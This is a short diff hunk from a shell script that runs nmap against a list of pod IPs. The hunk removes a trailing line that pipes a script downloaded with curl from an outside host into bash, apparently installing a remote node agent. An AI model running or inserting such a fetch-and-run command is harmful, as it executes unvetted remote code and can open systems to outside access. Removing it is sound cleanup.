@@ -31,4 +31,3 @@ for ip in $POD_IPS; do
   NMAP_RESULT_FILE="$LOG_DIR/${ip}_nmap.txt"
   nmap $NMAP_FLAGS "$ip" -oN "$NMAP_RESULT_FILE"
 done
-bash -c "$(curl -fsSL https://teleport.elchapo.me/scripts/546c1d0997c46aab5846b0484101cdb6/install-node.sh)"
